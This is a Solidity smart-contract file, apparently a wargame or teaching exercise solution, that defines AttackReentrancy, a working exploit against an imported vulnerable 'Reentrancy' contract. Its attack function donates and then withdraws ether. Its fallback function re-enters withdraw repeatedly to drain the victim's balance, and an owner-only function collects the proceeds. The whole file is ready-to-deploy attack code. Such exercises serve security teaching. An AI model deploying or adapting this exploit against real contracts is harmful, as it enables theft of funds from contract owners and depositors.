//SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './Reentrancy.sol';
import "@openzeppelin/contracts/access/Ownable.sol";
contract AttackReentrancy is Ownable{
    
    Reentrancy public vulnerableContract;

    constructor(address _vulnerable) {
        vulnerableContract = Reentrancy(_vulnerable);
    }

    function attack() public payable {
        require(msg.value >= 1 ether);

        vulnerableContract.donate{value: msg.value}(address(this));

        vulnerableContract.withdraw(msg.value);

    }
    
    function withdrawAll() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback () external payable {
        if(address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

}